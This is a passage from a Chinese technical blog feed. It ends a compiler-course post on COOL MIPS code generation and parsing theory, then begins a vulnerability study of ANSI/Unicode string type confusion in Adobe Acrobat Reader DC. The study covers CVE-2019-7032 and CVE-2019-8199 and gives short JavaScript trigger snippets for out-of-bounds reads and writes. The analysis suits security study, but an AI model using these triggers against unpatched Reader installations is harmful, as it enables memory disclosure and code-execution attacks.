class="symbol">Main.main:</span></span><br><span class="line">  <span class="comment">#...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">lw </span> $<span class="built_in">a0</span> <span class="number">12</span>($<span class="built_in">s0</span>)         <span class="comment"># 获取Main类的特定成员变量地址</span></span><br><span class="line">  <span class="keyword">sw </span> $<span class="built_in">a0</span> <span class="number">0</span>($<span class="built_in">sp</span>)          <span class="comment"># 压栈，作为下一个函数的参数</span></span><br><span class="line">  <span class="keyword">addiu </span>$<span class="built_in">sp</span> $<span class="built_in">sp</span> -<span class="number">4</span></span><br><span class="line">  <span class="keyword">move </span> $<span class="built_in">a0</span> $<span class="built_in">s0</span>           <span class="comment"># 设置$a0为self，便于在下面中定位函数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">lw </span> $<span class="built_in">t1</span> <span class="number">8</span>($<span class="built_in">a0</span>)          <span class="comment"># 获取Main_dispTab地址</span></span><br><span class="line">  <span class="keyword">lw </span> $<span class="built_in">t1</span> <span class="number">16</span>($<span class="built_in">t1</span>)         <span class="comment"># 获取Main.out_int函数地址</span></span><br><span class="line">  <span class="keyword">jalr </span> $<span class="built_in">t1</span>               <span class="comment"># 无条件跳转执行</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>函数返回时，将<code>$s0</code>重新赋给<code>$a0</code>，并将<code>$s0</code>恢复至上一个类地址。</p>
</li>
<li>
<p>这一整个流程下来，<code>$s0</code>和<code>$a0</code>的值不变，函数执行前与函数执行后的值一致相同。</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>cool-mips中的GC</p>
<ul>
<li>
<p>cool语言的<code>cgen</code>在传入不同的参数下可以选择使用的GC类型（也可以不选）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* handle_flag.cc */</span></span><br><span class="line">Memmgr cgen_Memmgr = GC_NOGC;      <span class="comment">// enable/disable garbage collection</span></span><br><span class="line">Memmgr_Test cgen_Memmgr_Test = GC_NORMAL;  <span class="comment">// normal/test GC</span></span><br><span class="line">Memmgr_Debug cgen_Memmgr_Debug = GC_QUICK; <span class="comment">// check heap frequently</span></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">'g'</span>:  <span class="comment">// enable garbage collection</span></span><br><span class="line">  cgen_Memmgr = GC_GENGC;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'t'</span>:  <span class="comment">// run garbage collection very frequently (on every allocation)</span></span><br><span class="line">  cgen_Memmgr_Test = GC_TEST;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'T'</span>:  <span class="comment">// do even more pedantic tests in garbage collection</span></span><br><span class="line">  cgen_Memmgr_Debug = GC_DEBUG;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* cgen.cc */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *gc_init_names[] =</span><br><span class="line">  &#123; <span class="string">"_NoGC_Init"</span>, <span class="string">"_GenGC_Init"</span>, <span class="string">"_ScnGC_Init"</span> &#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *gc_collect_names[] =</span><br><span class="line">  &#123; <span class="string">"_NoGC_Collect"</span>, <span class="string">"_GenGC_Collect"</span>, <span class="string">"_ScnGC_Collect"</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CgenClassTable::code_select_gc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Generate GC choice constants (pointers to GC functions)</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  str &lt;&lt; GLOBAL &lt;&lt; <span class="string">"_MemMgr_INITIALIZER"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  str &lt;&lt; <span class="string">"_MemMgr_INITIALIZER:"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  str &lt;&lt; WORD &lt;&lt; gc_init_names[cgen_Memmgr] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  str &lt;&lt; GLOBAL &lt;&lt; <span class="string">"_MemMgr_COLLECTOR"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  str &lt;&lt; <span class="string">"_MemMgr_COLLECTOR:"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  str &lt;&lt; WORD &lt;&lt; gc_collect_names[cgen_Memmgr] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  str &lt;&lt; GLOBAL &lt;&lt; <span class="string">"_MemMgr_TEST"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  str &lt;&lt; <span class="string">"_MemMgr_TEST:"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  str &lt;&lt; WORD &lt;&lt; (cgen_Memmgr_Test == GC_TEST) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当<code>cgen_Memmgr == GC_GENGC</code>时，<code>_GenGC_Assign</code>函数只在<code>AttributeBinding::code_update</code>中被调用，以记录成员变量的赋值操作至<code>assignment table</code></p>
<blockquote>
<p><code>assignment table</code> 用于分代垃圾回收。由于尚未学习GC的相关算法，故具体细节暂不追究。</p>
</blockquote>
</li>
<li>
<p>当<code>cgen_Memmgr_Debug == GC_DEBUG</code>时，<code>_gc_check</code>函数会被频繁调用，以检测对象的<code>eye catcher</code>是否存在。具体细节请查阅下述伪代码。</p>
<blockquote>
<p>这个check的用意，私以为是对特定变量进行检测，防止heap chunk的 <strong>重叠/被覆盖</strong></p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $a1 存放 堆上某个对象的起始地址</span></span><br><span class="line">def _gc_check($a1):</span><br><span class="line">  <span class="keyword">if</span> $a1 != <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> (obj_eyecatch($a1) != <span class="number">-1</span>): <span class="comment">// obj_eyecatch: offset from object pointer to the eyecatcher  </span></span><br><span class="line">      _gc_abort()</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>_GenGC_Collect</code>方法会在<code>Object.copy</code>函数中内部调用，以分配一块堆内存</p>
</li>
</ul>
</li>
</ul>
<h2 id="6-思考题">6. 思考题</h2>
<ul>
<li>
<blockquote>
<p>描述每种文法（LL(1),SLR, LR(1), LALR等…)的使用条件，和它是为了解决什么问题？</p>
</blockquote>
<ul>
<li><code>LL(1)</code> :
<ul>
<li>使用条件： 对于产生式A-&gt;α|β
<ul>
<li>当α、β均不能推出ε时，FIRST(α) ∩ FIRST(β) = φ</li>
<li>α、β最多有一个能推出ε。同时当α、β中的某个符号推出ε时，另一个符号的FOLLOW集 ∩ FIRST(A) = φ</li>
</ul>
</li>
</ul>
</li>
<li><code>SLR</code> :
<ul>
<li>使用条件：不产生冲突</li>
<li>解决的问题：<code>LR(0)</code>没有考虑文法符号的上下文环境，当进入任何一个规约状态时，总是会采取规约动作，这会造成 <strong>归约-移入冲突</strong>。而<code>SLR</code>限制了规约条件，也就是当进入规约状态时，只有当下一个符号属于规约项目的FOLLOW集时，才可以进行规约动作。</li>
</ul>
</li>
<li><code>LR(1)</code> :
<ul>
<li>使用条件：需要忍受<code>LR(1)</code>自动机的高状态数所带来的影响。</li>
<li>解决的问题： <code>SLR</code>只是简单判断下一个输入符号是否属于规约项目的FOLLOW集，只能排除不合理的规约而不能确保正确的规约。而<code>LR(1)</code>引入 <strong>后继符</strong> 这个概念。后继符集合是FOLLOW集的子集，故可进一步限制了规约的条件。</li>
</ul>
</li>
<li><code>LALR</code> :
<ul>
<li>使用条件：合并项集后所构造出的语法分析表中，不存在语法分析动作冲突。</li>
<li>解决的问题： <code>LR(1)</code>根据展望符集合的不同，将原始的<code>LR(0)</code>项目分裂成了不同的<code>LR(1)</code>项目。这会增大<code>LR(1)</code>自动机的状态数。而<code>LALR</code>将相同核心的<code>LR(1)</code>项集合并为一个项集，从而减少自动机的状态数。</li>
</ul>
</li>
</ul>
</li>
<li>
<blockquote>
<p>可以将cool语言的语义分析中 <code>!type_leq(type2, nd-&gt;get_name())</code>修改为<code>type_leq(nd-&gt;get_name(),type2)</code>吗？为什么？</p>
</blockquote>
<ul>
<li>
<p>先试着改了然后编译，发现错了五个，很明显是改不了的</p>
</li>
<li>
<p>那为什么是改不了的呢？我们需要从<code>type_leq</code>这两个函数的功能开始说起</p>
</li>
<li>
<p><code>type_leq</code>的功能是，查找<code>supertype</code>是否位于<code>subtype</code>的传递链中。以下图为例：</p>
  <pre class="mermaid">      graph LR;
  OBJECT-->A
  OBJECT-->B;
  B-->C;</pre>
<ul>
<li><code>type_leq(C, B)</code>会返回<code>true</code></li>
<li><code>type_leq(C, A)</code>返回<code>false</code></li>
</ul>
</li>
<li>
<p>这就涉及到一个有趣的问题，当<code>A &lt;= B</code>为<code>false</code>时，是否就一定是<code>A &gt; B</code>呢？反之亦然呢？以上面的两条代码为例，我们可以很容易的得到：</p>
<ul>
<li>若<code>type_leq(B, C)</code>为<code>false</code>，则<code>type_leq(C, B)</code>为<code>true</code></li>
<li>若<code>type_leq(C, A)</code>为<code>false</code>，则<code>type_leq(A, C)</code>仍为<code>false</code></li>
</ul>
</li>
<li>
<p>很明显,<code>A</code>和<code>C</code>无论如何也没有从属关系，所以这两个类型是 <strong>没办法比较</strong> 的。既然都没办法比较了，那就更无从谈起谁大谁小了。所以无论<code>A &lt;= C</code> 还是 <code>C &lt;= A</code> 都是<code>false</code>。</p>
</li>
<li>
<p>所以, <code>type_lub</code>里的那条语句是无法替换的。</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>Compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串类型混淆漏洞的研究</title>
    <url>/2020/06/ANSI-Unicode-type-confusion-study/</url>
    <content><![CDATA[<h2 id="1-简介">1. 简介</h2>
<ul>
<li>现在几乎已经很少会看到关于恶意字符串所造成的漏洞了，更不用说那些可利用的字符串了</li>
<li>这并不奇怪，因为SDL(安全开发生命周期)已经禁止了所有不安全的函数</li>
<li>但是，如果开发人员错误地使用了增强的安全功能，仍然可能造成严重的安全漏洞。</li>
<li>在adobe acrobat Reader DC中，开发人员已经实现了一些增强的安全字符串处理函数。但开发人员有可能会错误使用这些函数。</li>
<li>在一般情况下，这不是什么大问题。然而，在这个特定的软件中处理字符串时，类型混淆的情况也很容易被触发。</li>
<li>在某些场景中，可以利用这两个条件来实现代码执行。</li>
</ul>
<a id="more"></a>
<h2 id="2-基本概念">2. 基本概念</h2>
<blockquote>
<p>Adobe Acrobat Reader DC使用SpiderMonkey(可能是24.2.0版本)作为其JavaScript引擎。</p>
</blockquote>
<h3 id="a-字符串类型">a. 字符串类型</h3>
<ul>
<li>字符串在Windows上可以分为两类: <code>ANSI</code>字符串和<code>Unicode</code>字符串</li>
<li><code>ANSI</code>字符串由一系列<code>ANSI</code>字符组成，其中每个字符编码为8位值；<br>
<code>Unicode</code>字符串由一系列<code>Unicode</code>字符组成。</li>
<li>Windows主要使用<code>UTF-16</code>编码的<code>Unicode</code>字符，其中每个字符编码为16位值。</li>
<li><code>ANSI</code>字符串的结束符是<code>\x00</code>, <code>Unicode</code>字符串的结束符是<code>\x00\x00</code></li>
</ul>
<h3 id="b-Byte-Order-Mark-BOM">b. Byte Order Mark (BOM)</h3>
<ul>
<li>如果一个字符有多个字节的数据，那么它可以用两种形式表示: <strong>大端序</strong>（little-endian）和 <strong>小端序</strong> （big-endian）</li>
<li><strong>大端序</strong> 将最重要字节放在前面，最不重要字节放在最后，而 <strong>小端序</strong> 顺序则相反</li>
<li>例子
<table>
<thead>
<tr>
<th style="text-align:center">character</th>
<th style="text-align:center">UTF-16 Encoding</th>
<th style="text-align:center">Little-Endian</th>
<th style="text-align:center">Big-Endian</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">中</td>
<td style="text-align:center">U + 4E2D</td>
<td style="text-align:center">2D 4E</td>
<td style="text-align:center">4E 2D</td>
</tr>
<tr>
<td style="text-align:center">文</td>
<td style="text-align:center">U + 6587</td>
<td style="text-align:center">87 65</td>
<td style="text-align:center">65 87</td>
</tr>
</tbody>
</table>
</li>
<li>对于<code>UTF-16</code>字符串，可以在字符集名称中指定字节顺序。例如，UTF16<code>LE</code>表示字节顺序是little-endian，而UTF-16<code>BE</code>表示字节顺序是big-endian</li>
<li>我们还可以使用字节顺序标记(byte order mark, BOM)字符<code>U+FEFF</code>来指定字符串的字节顺序</li>
<li>BOM字符本身的字节顺序表示整个字符串的字节顺序。如果没有显式地指定，字符串的字节顺序可以是特定于平台的</li>
<li>例子
<table>
<thead>
<tr>
<th style="text-align:center">UTF-16 String</th>
<th style="text-align:center">Little-Endian</th>
<th style="text-align:center">Big-Endian</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">中文</td>
<td style="text-align:center"><code>FF FE</code> 2D 4E 87 65</td>
<td style="text-align:center"><code>FE FF</code> 4E 2D 65 87</td>
</tr>
</tbody>
</table>
</li>
</ul>
<blockquote>
<p>注意：<code>BOM</code>字符将始终位于字符串的开头。把它放在别的地方是没有意义的。</p>
</blockquote>
<ul>
<li>这张图片简单的概括了上面内容。注意：<code>BOM</code>字符不唯一。<code>FE FF</code>是<code>BOM</code>字符，而图中的<code>EF BB BF</code> 也是<code>BOM</code>字符<br>
<img src="/2020/06/ANSI-Unicode-type-confusion-study/1.png" alt="img"></li>
</ul>
<h3 id="c-一些字符串的处理函数">c. 一些字符串的处理函数</h3>
<ul>
<li>
<p>这里只列举其中的一个函数：<code>strncpy</code></p>
</li>
<li>
<p>大部分认为<code>strncpy</code>会比<code>strcpy</code>更安全，原因是<code>strcpy</code>中的第三个参数指定了处理数据的大小</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strncpy</span><span class="params">(<span class="keyword">char</span> *destination, <span class="keyword">const</span> <span class="keyword">char</span> *source, <span class="keyword">size_t</span> num)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在大多数情况下，这看上去是正确的。但在处理一些特殊的情况时，它仍然很不安全。<br>
如果源字符串的长度等于或大于第三个参数num的值，则不会将在目标字符串的末尾添加NULL字符。<br>
而在处理没有终止符的字符串时，它将导致越界访问。以下是<code>strncpy</code>的源代码（来自glibc-2.23）:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">STRNCPY (<span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size = __strnlen (s2, n);</span><br><span class="line">  <span class="keyword">if</span> (size != n)</span><br><span class="line">    <span class="built_in">memset</span> (s1 + size, <span class="string">'\0'</span>, n - size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span> (s1, s2, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>这是为什么呢？原因是<code>strncpy</code>在设计时本来就不是<code>strcpy</code>的安全版本。</p>
</li>
<li>
<p><code>strncpy_s</code>是微软实现的一个安全增强版本。在将内容复制到目标缓冲区时，这些函数总是确保可以追加终止<code>null</code>字符。否则，操作失败，将调用无效的参数处理程序。</p>
</li>
<li>
<p>如果错误地使用了字符串处理函数的安全增强版本，则不能保证它们是安全的。例如，如果开发人员将错误的值作为目标缓冲区的大小，即使是函数<code>strcpy_s</code>也可能导致缓冲区溢出。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> src[<span class="number">32</span>] = &#123; <span class="string">"0123456789abcdef"</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> dst[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">strcpy_s(dst, <span class="number">0x7FFF</span> <span class="comment">/*dst_size*/</span>, src);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="3-漏洞学习">3. 漏洞学习</h2>
<h3 id="前置说明">* 前置说明</h3>
<ul>
<li>
<p>adobe acrobat reader DC实现了一些增强的安全字符串处理功能，例如以下部分函数：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Generic API</th>
<th style="text-align:center">ANSI Version</th>
<th style="text-align:center">Unicode Version</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">strnlen_safe</td>
<td style="text-align:center">ASstrnlen_safe</td>
<td style="text-align:center">miUCSStrlen_safe</td>
</tr>
<tr>
<td style="text-align:center">strncpy_safe</td>
<td style="text-align:center">ASstrncpy_safe</td>
<td style="text-align:center">miUCSStrncpy_safe</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>在处理字符串时，通用api将检查字符串的类型并将请求重定向到相应的函数。下面的代码展示了函数strnlen_safe是如何工作的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">strnlen_safe</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_bytes, <span class="keyword">void</span> *error_handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> result;</span><br><span class="line">    <span class="keyword">if</span> (str &amp;&amp; str[<span class="number">0</span>] == <span class="number">0xFE</span> &amp;&amp; str[<span class="number">1</span>] == <span class="number">0xFF</span>)</span><br><span class="line">        result = miUCSStrlen_safe(str, max_bytes, error_handler);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        result = ASstrnlen_safe(str, max_bytes, error_handler);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在当前情况下，函数根据字符串的前两个字节检查字符串的类型。如果第一个字节是0xFE，第二个字节是0xFF，则该字符串将被识别为Unicode字符串，否则将被识别为ANSI字符串。而实际上，<code>FE FF</code>是 <strong>BOM的大端序标记字符</strong></p>
</li>
<li>
<p>触发漏洞需要满足以下两个条件：</p>
<ul>
<li>
<p>检查字符串的类型时可能会引发类型混淆。如果前两个字节是FE FF, ANSI字符串可以被识别为Unicode字符串。这可能导致越界访问，因为在ANSI字符串中找不到Unicode null终止符。例如以下表格：</p>
<table>
<thead>
<tr>
<th style="text-align:center">char</th>
<th style="text-align:center">.</th>
<th style="text-align:center">.</th>
<th style="text-align:center">F</th>
<th style="text-align:center">a</th>
<th style="text-align:center">k</th>
<th style="text-align:center">e</th>
<th style="text-align:center"></th>
<th style="text-align:center">U</th>
<th style="text-align:center">n</th>
<th style="text-align:center">i</th>
<th style="text-align:center">c</th>
<th style="text-align:center">o</th>
<th style="text-align:center">d</th>
<th style="text-align:center">e</th>
<th style="text-align:center">.</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">HEX</td>
<td style="text-align:center">FE</td>
<td style="text-align:center">FF</td>
<td style="text-align:center">46</td>
<td style="text-align:center">61</td>
<td style="text-align:center">6B</td>
<td style="text-align:center">65</td>
<td style="text-align:center">20</td>
<td style="text-align:center">55</td>
<td style="text-align:center">6E</td>
<td style="text-align:center">69</td>
<td style="text-align:center">63</td>
<td style="text-align:center">6F</td>
<td style="text-align:center">64</td>
<td style="text-align:center">65</td>
<td style="text-align:center">00</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>开发人员不正确地使用了通用api。在大多数情况下，目标缓冲区的大小将设置为0x7FFFFFFF。如之前所述的那样，这可能会导致安全问题</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">strnlen_safe(a2,  <span class="number">0x7FFFFFFF</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="a-CVE-2019-7032">a. CVE-2019-7032</h3>
<h4 id="1-简介-2">1) 简介</h4>
<ul>
<li>CVE-2019-7032是一个越界读取漏洞，可以利用该漏洞实现绕过ASLR的信息公开。</li>
<li>该漏洞在天府杯中，结合<code>UAF</code>漏洞可以进行代码执行。</li>
</ul>
<blockquote>
<p>注：<code>CVE-2020-3804</code>与该<code>CVE</code>漏洞原理与漏洞补丁等等大致相同，本文中将不再赘述。</p>
</blockquote>
<h4 id="2-具体细节">2) 具体细节</h4>
<ul>
<li>
<p>此漏洞会被以下JS代码所触发</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Tested on Adobe Acrobat Reader DC 2019.010.20069</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">this</span>.addField(<span class="string">'f1'</span>, <span class="string">'text'</span>, <span class="number">0</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]);</span><br><span class="line">f.userName = <span class="string">'\xFE\xFF'</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当<code>ANSI</code>字符串被作为<code>Unicode</code>处理时，越界读取将会被触发，原因是处理函数无法找到<code>Unicode</code>字符串的终结符<code>\x00\x00</code><br>
以下为<code>miUCSStrlen_safe</code>函数源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">miUCSStrlen_safe</span><span class="params">(<span class="keyword">wchar_t</span> *src, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_bytes,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">void</span> *error_handler)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result;</span><br><span class="line">  <span class="keyword">wchar_t</span> *str = src;</span><br><span class="line">  <span class="keyword">if</span> ( src ) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> bytes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( max_bytes ) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> ch = *(<span class="keyword">char</span> *)str;</span><br><span class="line">        ++str;</span><br><span class="line">        <span class="keyword">if</span> ( !ch &amp;&amp; !*((<span class="keyword">char</span> *)str - <span class="number">1</span>) ) <span class="keyword">break</span>; <span class="comment">// check Unicode terminator</span></span><br><span class="line">        bytes += <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ( bytes &lt; max_bytes );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( bytes == max_bytes ) &#123;</span><br><span class="line">      <span class="keyword">void</span> *handler = hb_set_invert;</span><br><span class="line">      <span class="keyword">if</span> ( error_handler ) handler = error_handler;</span><br><span class="line">      handler(<span class="string">L"String greater than maxSize"</span>, <span class="string">L"miUCSStrlen_safe"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      result = max_bytes;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result = bytes;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *handler = hb_set_invert;</span><br><span class="line">      <span class="keyword">if</span> ( error_handler ) handler = error_handler;</span><br><span class="line">      handler(<span class="string">L"Bad parameter"</span>, <span class="string">L"miUCSStrlen_safe"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>该漏洞是在为字段对象分配用户名属性时触发的。关键的部分是原始字符串将被复制到新创建的堆缓冲区中，该缓冲区将与属性相关联。<br>
这意味着我们可以通过JavaScript代码读取泄漏的信息。下面的代码显示了简化的漏洞模型。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src &lt;- field.userName &lt;- "\xFE\xFF....."</span></span><br><span class="line"><span class="comment">// len &lt;- number of bytes</span></span><br><span class="line"><span class="keyword">size_t</span> len = strnlen_safe(src, <span class="number">0x7FFFFFFF</span>, <span class="number">0</span>);  <span class="comment">// Out-Of-Bounds Read</span></span><br><span class="line"><span class="keyword">char</span>* dst = <span class="built_in">calloc</span>(<span class="number">1</span>, aligned_size(len + <span class="number">4</span>));</span><br><span class="line"><span class="built_in">memcpy</span>(dst, src, len);                          <span class="comment">// Information Disclosure</span></span><br><span class="line">dst[len] = dst[len + <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="comment">// field.userName &lt;- dst</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="3-漏洞修补分析">3) 漏洞修补分析</h4>
<ul>
<li>该漏洞已在adobe acrobat reader DC 2019.010.20091中修复。</li>
<li>通过放置额外3个<code>NULL</code>字节（实际上4个）至堆缓冲区的末端。</li>
<li>即便<code>ANSI</code>字符串是由函数<code>miUCSStrlen_safe</code>处理的，它也会正常工作，因为<code>Unicode-NULL</code>终止符总是可以被找到。</li>
</ul>
<h3 id="b-CVE-2019-8199">b. CVE-2019-8199</h3>
<h4 id="1-简介-3">1) 简介</h4>
<ul>
<li>CVE-2019-8199是一个越界读写漏洞，可以利用它来实现代码执行。</li>
</ul>
<h4 id="2-具体细节-2">2) 具体细节</h4>
<ul>
<li>
<p>此漏洞会被以下JS代码触发</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Tested on Adobe Acrobat Reader DC 2019.010.20099</span></span><br><span class="line">Collab.unregisterReview(<span class="string">'\xFE\xFF'</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>与上面的CVE相同，之所以可以触发越界读写，是因为处理<code>ANSI</code>字符串时无法找到<code>Unicode</code>终止符。<br>
以下是<code>miUCSStrcpy_safe</code>源代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">miUCSStrcpy_safe</span><span class="params">(<span class="keyword">wchar_t</span> *dst, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_bytes,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">wchar_t</span> *src, <span class="keyword">void</span> *error_handler)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">wchar_t</span> *ptr = dst;</span><br><span class="line">  <span class="keyword">if</span> ( dst ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( src ) &#123;</span><br><span class="line">      <span class="keyword">if</span> ( max_bytes &gt; <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> max_len = max_bytes &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          <span class="keyword">wchar_t</span> e = *(<span class="keyword">wchar_t</span> *)((<span class="keyword">char</span> *)ptr + (<span class="keyword">char</span> *)src - (<span class="keyword">char</span> *)dst);</span><br><span class="line">          *ptr = e;</span><br><span class="line">          ++ptr;</span><br><span class="line">          <span class="keyword">if</span> ( !e ) <span class="keyword">break</span>;          <span class="comment">// check Unicode terminator</span></span><br><span class="line">          --max_len;</span><br><span class="line">        &#125; <span class="keyword">while</span> ( max_len );</span><br><span class="line">        <span class="keyword">if</span> ( !max_len ) &#123;</span><br><span class="line">          *(ptr - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">void</span> *handler = Handler;</span><br><span class="line">          <span class="keyword">if</span> ( error_handler ) handler = error_handler;</span><br><span class="line">          handler(<span class="string">L"Destination too small"</span>, <span class="string">L"miUCSStrcpy_safe"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( max_bytes &gt; <span class="number">1</span> ) &#123;</span><br><span class="line">        *dst = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">void</span> *handler = Handler;</span><br><span class="line">  <span class="keyword">if</span> ( error_handler ) handler = error_handler;</span><br><span class="line">  handler(<span class="string">L"Bad parameter"</span>, <span class="string">L"miUCSStrcpy_safe"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>该漏洞在调用<code>Collab.unregisterReview</code>函数时被触发。关键的部分是原始字符串将被复制到新创建的堆缓冲区中，该缓冲区的大小是通过调用<code>ASstrnlen_safe</code>计算的。但是复制请求是由函数<code>strcpy_safe</code>处理的。下面的代码显示了简化的漏洞模型</p>
